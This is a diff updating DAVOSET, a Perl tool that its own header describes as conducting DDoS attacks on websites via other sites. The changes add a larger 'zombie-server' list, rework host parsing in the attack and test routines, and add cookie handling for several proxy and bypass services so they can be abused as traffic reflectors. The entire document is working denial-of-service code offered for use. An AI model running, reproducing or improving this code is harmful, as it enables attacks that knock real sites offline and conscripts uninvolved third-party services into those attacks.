@@ -1,19 +1,19 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.3
+# DAVOSET v.1.3.1
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2017
-# Last update: 09.03.2017
+# Last update: 04.04.2017
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.3"; # program version
+my $version = "1.3.1"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
 my $default_site = ""; # default site for attack
 my $testURL = "http://www.google.com"; # default site for testing botnet
-my $list_servers = "list.txt"; # list of zombie-servers
+my $list_servers = "list_full.txt"; # list of zombie-servers
 my $mode = "1"; # 0 - standard mode, 1 - cyclic mode
 my $cycles = "1000"; # number of cycles in cyclic mode
 my $max_cycles = "1000"; # maximum number of cycles in cyclic mode
@@ -180,24 +180,23 @@ sub Attack { # send request to zombie-server
 		}
 	}
 	if ($method eq "WP") {
-		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
+		$url =~ m|https?://([^/]+)(/.+/)?([^/]+)?|;
 		$host = $1;
 		$page = $2;
 	}
 	else {
-		$url =~ m|(https?://[^/]+)(/.+)?|;
+		$url =~ m|https?://([^/]+)(/.+)?|;
 		$host = $1;
 		$page = $2;
 	}
 	$page |= "/";
 	$port = $1 if ($host =~ /:(\d+)$/);
 	$port ||= $default_port;
-	$host =~ s|^http://||;
 	if ($host eq "browsershots.org") {
 		$csrftoken = &GetCsrfToken;
 	}
-	elsif ($host eq "ping-admin.ru") {
-		$cookie = &GetCookie($page);
+	elsif (CheckCookie($host)) {
+		$cookie = &GetCookie($url);
 	}
 	if ($proxy) {
 		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "$port");
@@ -335,24 +334,23 @@ sub TestServer { # test zombie-server
 		}
 	}
 	if ($method eq "WP") {
-		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
+		$url =~ m|https?://([^/]+)(/.+/)?([^/]+)?|;
 		$host = $1;
 		$page = $2;
 	}
 	else {
-		$url =~ m|(https?://[^/]+)(/.+)?|;
+		$url =~ m|https?://([^/]+)(/.+)?|;
 		$host = $1;
 		$page = $2;
 	}
 	$page |= "/";
 	$port = $1 if ($host =~ /:(\d+)$/);
 	$port ||= $default_port;
-	$host =~ s|^http://||;
 	if ($host eq "browsershots.org") {
 		$csrftoken = &GetCsrfToken;
 	}
-	elsif ($host eq "ping-admin.ru") {
-		$cookie = &GetCookie($page);
+	elsif (CheckCookie($host)) {
+		$cookie = &GetCookie($url);
 	}
 	if ($proxy) {
 		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "$port");
@@ -470,21 +468,29 @@ sub GetCsrfToken { # get CSRF token
 
 sub GetCookie { # get cookie
 	my $url = $_[0];
-	my ($sock,$content,@cookies,$cookie);
+	my ($host,$page,$sock,$content,@cookies,$cookie);
 
-	$url =~ s/index.sema/free_seo\//;
-	if ($proxy) {
-		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "ping-admin.ru", ConnectPort => "80");
+	$url =~ m|https?://([^/]+)(/.+)?|;
+	$host = $1;
+	$page = $2;
+	if ($host eq "ping-admin.ru") {
+		$page =~ s/index.sema/free_seo\//;
 	}
 	else {
-		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "ping-admin.ru", PeerPort => "80");
+		$page = "/";
+	}
+	if ($proxy) {
+		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "80");
+	}
+	else {
+		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "80");
 	}
 	if (!$sock) {
 		print "The Socket: $!\n";
 		return;
 	}
-	print $sock "GET $url HTTP/1.1\n";
-	print $sock "Host: ping-admin.ru\n";
+	print $sock "GET $page HTTP/1.1\n";
+	print $sock "Host: $host\n";
 	print $sock "User-Agent: $agent\n";
 	print $sock "Accept: */*\n";
 	print $sock "Connection: close\r\n\r\n";
@@ -492,12 +498,18 @@ sub GetCookie { # get cookie
 	while (<$sock>) {
 		$content .= $_;
 	}
-	while ($content =~ /Set-Cookie: (.+?=.+?); expires/g) {
-		push(@cookies,$1);
+	if ($host eq "ping-admin.ru") {
+		while ($content =~ /Set-Cookie: (.+?); /gi) {
+			push(@cookies,$1);
+		}
+		$cookie = join("; ",@cookies);
 	}
-	$cookie = join("; ",@cookies);
+	else {
+		$content =~ /Set-Cookie: (s=.+?); /i;
+		$cookie = $1;
+	}
 	if ($show_stat) {
-		$traffic .= "GET / HTTP/1.1\nHost: ping-admin.ru\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
+		$traffic .= "GET $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
 	}
 	return $cookie;
 }
@@ -527,5 +539,17 @@ sub CheckURL { # web sites which require "http" for target URL
 	return 1 if ($url =~ m|^http://services.w3.org|);
 	return 1 if ($url =~ m|^http://proxy2974.my-addr.org|);
 	return 1 if ($url =~ m|^http://dacd.win|);
+	return 0;
+}
+
+sub CheckCookie { # web sites which require cookies
+	my $url = $_[0];
+
+	return 1 if ($url eq "ping-admin.ru");
+	return 1 if ($url eq "ghostproxy.eu");
+	return 1 if ($url eq "yavz.xyz");
+	return 1 if ($url eq "iwaz.gq");
+	return 1 if ($url eq "shinyproxy.com");
+	return 1 if ($url eq "bypasstool.gq");
 	return 0;
 }
